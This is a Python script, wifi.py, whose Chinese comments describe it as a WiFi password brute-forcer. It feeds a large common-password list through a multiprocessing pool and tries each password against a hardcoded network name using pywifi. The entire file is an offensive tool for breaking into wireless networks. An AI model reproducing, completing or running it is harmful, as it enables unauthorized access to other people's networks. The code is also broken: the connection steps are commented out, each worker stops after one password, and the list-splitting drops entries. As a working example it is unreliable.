# !/usr/bin/env python
# -*- coding:utf-8 -*-  
""" 
@file: wifi.py
@time: 2022-09-28
@desc: 暴力破解WiFi，通过最常用的100万个密码试
"""
import math
import os
import time
import pywifi
from pywifi import const

from multiprocessing import Manager, Pool

current_path = os.path.dirname(os.path.abspath(__file__))
password_path = os.path.join(current_path, "password.txt")


def read_passwords(path):
    with open(path, "r", encoding="utf-8") as f:
        res = f.readlines()
        print("read_passwords")
        return res


def list_split(origin, sub_count=2):
    res = []
    origin_len = len(origin)
    sub_len = math.ceil((origin_len - 1) / sub_count)
    start = 0
    end = sub_len
    for i in range(sub_count):
        sub_list = origin[start:end]
        start = end
        end = min(end + sub_len, origin_len - 1)
        res.append(sub_list)
    return res


def put_data_to_queue(queue, data, sub_list=100):
    print("put data")
    sub_list = list_split(data, sub_list)
    for item in sub_list:
        queue.put(item)


def connect_wifi(passwords, iface, ssid):
    print("connect_wifi")
    print(f"pid: {os.getpid()}")
    for password in passwords:
        if iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]:
            # profile = pywifi.Profile()
            # profile.ssid = ssid
            # profile.auth = const.AUTH_ALG_OPEN
            # profile.akm.append(const.AKM_TYPE_WPA2PSK)
            # profile.cipher = const.CIPHER_TYPE_CCMP
            # profile.key = password
            #
            # iface.remove_all_network_profiles()
            # tmp_profile = iface.add_network_profile(profile)
            #
            # iface.connect(tmp_profile)
            time.sleep(0.001)
            if iface.status() == const.IFACE_CONNECTED:
                print(f"连接{ssid}成功,密码：{password}")
                return True
            else:
                print(f"连接{ssid}失败,密码：{password}")
                return False


def main():
    passwords = read_passwords(password_path)
    queue = Manager().Queue()

    max_size = 20
    po = Pool(max_size + 1)
    # 向队列中放入数据
    po.apply_async(put_data_to_queue, (queue, passwords))

    # 找到网卡 先断开连接
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    # iface.disconnect()
    ssid = "1111"

    while not queue.empty():
        passwords = queue.get()
        po.apply_async(connect_wifi, (passwords, iface, ssid))

    po.close()  # 关闭进程池，不再接受新的进程
    po.join()  # 主进程阻塞等待子进程的退出


if __name__ == '__main__':
    main()
